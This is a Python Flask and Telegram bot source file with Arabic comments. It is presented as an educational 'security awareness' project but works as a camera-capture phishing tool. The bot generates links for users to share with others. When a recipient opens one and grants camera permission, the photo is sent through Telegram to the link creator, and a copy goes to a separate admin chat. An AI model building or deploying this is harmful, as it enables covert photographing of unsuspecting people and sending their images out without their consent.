"""
Camera Awareness Bot - بوت قياس الوعي الأمني
مشروع تعليمي مفتوح المصدر
"""

import os
import uuid
import base64
import threading
import requests
from io import BytesIO
from flask import Flask, render_template, request, jsonify
from config import TELEGRAM_BOT_TOKEN, ADMIN_CHAT_ID, FLASK_HOST, FLASK_PORT, FLASK_DEBUG

app = Flask(__name__)

# تخزين مؤقت للروابط النشطة
active_links = {}

BASE_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"


def send_telegram_photo(chat_id, photo_bytes, caption=""):
    """إرسال صورة لمحادثة تليجرام"""
    url = f"{BASE_URL}/sendPhoto"
    files = {"photo": ("capture.jpg", photo_bytes, "image/jpeg")}
    data = {"chat_id": chat_id, "caption": caption}
    try:
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.json()
    except Exception as e:
        print(f"Error sending photo: {e}")
        return None


def send_telegram_message(chat_id, text):
    """إرسال رسالة نصية"""
    url = f"{BASE_URL}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    try:
        response = requests.post(url, json=data, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Error sending message: {e}")
        return None


def setup_webhook():
    """إعداد Webhook للبوت (اختياري)"""
    pass


@app.route("/")
def home():
    """الصفحة الرئيسية"""
    return "<h1>Camera Awareness Bot</h1><p>استخدم /start في البوت للحصول على رابط</p>"


@app.route("/capture/<link_id>")
def capture_page(link_id):
    """صفحة التقاط الكاميرا"""
    if link_id not in active_links:
        return "<h1>رابط غير صالح أو منتهي</h1>", 404

    owner_chat_id = active_links[link_id]["chat_id"]
    return render_template("index.html", link_id=link_id)


@app.route("/upload/<link_id>", methods=["POST"])
def upload_photo(link_id):
    """استقبال الصورة من المتصفح"""
    if link_id not in active_links:
        return jsonify({"status": "error", "message": "رابط غير صالح"}), 404

    owner_chat_id = active_links[link_id]["chat_id"]

    try:
        # استلام الصورة من الطلب
        data = request.json
        image_data = data.get("image", "")

        if not image_data:
            return jsonify({"status": "error", "message": "لا توجد صورة"}), 400

        # فك تشفير Base64
        image_data = image_data.replace("data:image/jpeg;base64,", "")
        image_bytes = base64.b64decode(image_data)

        # إرسال الصورة لصاحب الرابط
        caption_owner = "📸 <b>تم التقاط صورة!</b>\n\n"                        "✅ المستخدم وافق على إذن الكاميرا\n"                        "⚠️ هذا يعني أنه قد يكون عرضة لهجمات التصيد"

        send_telegram_photo(owner_chat_id, BytesIO(image_bytes), caption_owner)

        # إرسال نسخة للأدمن
        caption_admin = f"📸 <b>تقرير وعي أمني</b>\n\n"                        f"👤 صاحب الرابط: <code>{owner_chat_id}</code>\n"                        f"🔗 معرف الرابط: <code>{link_id}</code>\n"                        f"📊 النتيجة: وافق على إذن الكاميرا"

        send_telegram_photo(ADMIN_CHAT_ID, BytesIO(image_bytes), caption_admin)

        # إرسال رسالة تلخيصية للأدمن
        send_telegram_message(ADMIN_CHAT_ID, 
            f"✅ <b>تم استلام صورة جديدة</b>\n"
            f"صاحب الرابط: {owner_chat_id}\n"
            f"الحالة: المستخدم وافق على الكاميرا")

        # حذف الرابط بعد الاستخدام (للأمان)
        del active_links[link_id]

        return jsonify({"status": "success", "message": "تم إرسال الصورة"})

    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/decline/<link_id>", methods=["POST"])
def decline_capture(link_id):
    """المستخدم رفض إعطاء إذن الكاميرا"""
    if link_id not in active_links:
        return jsonify({"status": "error", "message": "رابط غير صالح"}), 404

    owner_chat_id = active_links[link_id]["chat_id"]

    # إبلاغ صاحب الرابط
    send_telegram_message(owner_chat_id, 
        "🛡️ <b>مستخدم واعٍ أمنياً!</b>\n\n"
        "❌ المستخدم رفض إعطاء إذن الكاميرا\n"
        "✅ هذا يعني وعياً أمنياً جيداً")

    # إبلاغ الأدمن
    send_telegram_message(ADMIN_CHAT_ID, 
        f"🛡️ <b>تقرير وعي أمني - رفض</b>\n\n"
        f"👤 صاحب الرابط: <code>{owner_chat_id}</code>\n"
        f"🔗 معرف الرابط: <code>{link_id}</code>\n"
        f"📊 النتيجة: رفض إذن الكاميرا (واعٍ أمنياً)")

    # حذف الرابط
    del active_links[link_id]

    return jsonify({"status": "success", "message": "تم التسجيل"})


def bot_polling():
    """تشغيل البوت في الخلفية"""
    offset = 0

    while True:
        try:
            url = f"{BASE_URL}/getUpdates"
            params = {"offset": offset, "limit": 10}
            response = requests.get(url, params=params, timeout=30)
            updates = response.json().get("result", [])

            for update in updates:
                offset = update["update_id"] + 1

                if "message" not in update:
                    continue

                message = update["message"]
                chat_id = message["chat"]["id"]
                text = message.get("text", "")

                # أمر /start
                if text == "/start":
                    # توليد رابط فريد
                    link_id = str(uuid.uuid4())[:8]
                    active_links[link_id] = {"chat_id": chat_id}

                    # بناء الرابط
                    # سيتم استبدال YOUR_DOMAIN لاحقاً عند استلام أول طلب، أو يمكنك استخدام ngrok
                    capture_url = f"http://localhost:{FLASK_PORT}/capture/{link_id}"

                    send_telegram_message(chat_id,
                        f"🎣 <b>رابط الوعي الأمني جاهز!</b>\n\n"
                        f"🔗 <code>{capture_url}</code>\n\n"
                        f"📤 شارك هذا الرابط لاختبار وعي الآخرين\n"
                        f"📸 عند فتح الرابط، سيُطلب إذن الكاميرا\n"
                        f"⚠️ <i>تذكير: استخدم هذا فقط لأغراض تعليمية</i>")

                # أمر /help
                elif text == "/help":
                    send_telegram_message(chat_id,
                        "<b>📖 أوامر البوت:</b>\n\n"
                        "/start - توليد رابط جديد\n"
                        "/help - عرض هذه الرسالة\n\n"
                        "<b>كيفية الاستخدام:</b>\n"
                        "1. أرسل /start\n"
                        "2. شارك الرابط مع من تريد اختبار وعيه\n"
                        "3. انتظر النتيجة!")

        except Exception as e:
            print(f"Bot error: {e}")


if __name__ == "__main__":
    # تشغيل البوت في Thread منفصل
    bot_thread = threading.Thread(target=bot_polling, daemon=True)
    bot_thread.start()

    # تشغيل Flask
    app.run(host=FLASK_HOST, port=FLASK_PORT, debug=FLASK_DEBUG)
